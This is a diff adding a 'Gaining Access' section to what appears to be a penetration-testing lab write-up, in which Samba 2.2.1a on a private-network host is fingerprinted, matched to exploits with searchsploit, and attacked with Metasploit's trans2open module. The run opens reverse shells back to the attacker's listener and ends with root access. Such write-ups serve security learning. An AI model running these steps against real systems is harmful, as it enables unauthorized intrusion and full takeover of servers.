@@ -243,3 +243,81 @@ Progress: 141708 / 141709 (100.00%)
 Finished
 ===============================================================
 ```
+## **Gaining Access**
+### **Using SMB**
+> Indetify the SMB version using metasploit module.<br>
+> Search for the SMB version in the exploitdb using searchsploit
+
+    ```bash
+    msf6 auxiliary(scanner/smb/smb_version) > options
+    ----------------------------------------------------------------
+    Module options (auxiliary/scanner/smb/smb_version):
+
+    Name     Current Setting  Required  Description
+    ----     ---------------  --------  -----------
+    RHOSTS                    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+    RPORT                     no        The target port (TCP)
+    THREADS  1                yes       The number of concurrent threads (max one per host)
+    msf6 auxiliary(scanner/smb/smb_version) > set rhost 192.168.153.129
+    rhost => 192.168.153.129
+    msf6 auxiliary(scanner/smb/smb_version) > run
+    [*] 192.168.153.129:139   -   Host could not be identified: Unix (Samba 2.2.1a)
+    [*] 192.168.153.129:      - Scanned 1 of 1 hosts (100% complete)
+    [*] Auxiliary module execution completed
+    ```
+    ```bash
+    ┌──(root㉿KALI)-[/home/hrishi]
+    └─# searchsploit samba 2.2.1a           
+    --------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+    Exploit Title                                                                                                             |  Path
+    --------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+    Samba 2.2.0 < 2.2.8 (OSX) - trans2open Overflow (Metasploit)                                                               | osx/remote/9924.rb
+    Samba < 2.2.8 (Linux/BSD) - Remote Code Execution                                                                          | multiple/remote/10.c
+    Samba < 3.0.20 - Remote Heap Overflow                                                                                      | linux/remote/7701.txt
+    Samba < 3.6.2 (x86) - Denial of Service (PoC)                                                                              | linux_x86/dos/36741.py
+    --------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+    Shellcodes: No Results
+    ```
+> Found a metasploit module called "trans2open" to exploit
+> <br>Run this module with appropriate options and payload
+
+    ```bash
+    msf6 exploit(linux/samba/trans2open) > options
+    Module options (exploit/linux/samba/trans2open):
+    Name    Current Setting  Required  Description
+    ----    ---------------  --------  -----------
+    RHOSTS                   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+    RPORT   139              yes       The target port (TCP)
+    Payload options (linux/x86/meterpreter/reverse_tcp):
+    Name   Current Setting  Required  Description
+    ----   ---------------  --------  -----------
+    LHOST  192.168.153.128  yes       The listen address (an interface may be specified)
+    LPORT  4444             yes       The listen port
+    Exploit target:
+    Id  Name
+    --  ----
+    0   Samba 2.2.x - Bruteforce
+    ----------------------------------------------------------------
+    msf6 exploit(linux/samba/trans2open) > set rhosts 192.168.153.129
+    rhosts => 192.168.153.129
+    msf6 exploit(linux/samba/trans2open) > set payload linux/x86/shell_reverse_tcp
+    payload => linux/x86/shell_reverse_tcp
+    msf6 exploit(linux/samba/trans2open) > run
+    [*] Started reverse TCP handler on 192.168.153.128:4444 
+    [*] 192.168.153.129:139 - Trying return address 0xbffffdfc...
+    [*] 192.168.153.129:139 - Trying return address 0xbffffcfc...
+    [*] 192.168.153.129:139 - Trying return address 0xbffffbfc...
+    [*] 192.168.153.129:139 - Trying return address 0xbffffafc...
+    [*] 192.168.153.129:139 - Trying return address 0xbffff9fc...
+    [*] 192.168.153.129:139 - Trying return address 0xbffff8fc...
+    [*] 192.168.153.129:139 - Trying return address 0xbffff7fc...
+    [*] 192.168.153.129:139 - Trying return address 0xbffff6fc...
+    [*] Command shell session 1 opened (192.168.153.128:4444 -> 192.168.153.129:1025) at 2025-01-27 10:37:25 +0530
+
+    [*] Command shell session 2 opened (192.168.153.128:4444 -> 192.168.153.129:1026) at 2025-01-27 10:37:26 +0530
+    [*] Command shell session 3 opened (192.168.153.128:4444 -> 192.168.153.129:1027) at 2025-01-27 10:37:28 +0530
+    [*] Command shell session 4 opened (192.168.153.128:4444 -> 192.168.153.129:1028) at 2025-01-27 10:37:29 +0530
+    id
+    uid=0(root) gid=0(root) groups=99(nobody)
+    ```
+> Got direct reverse shell with root privileges
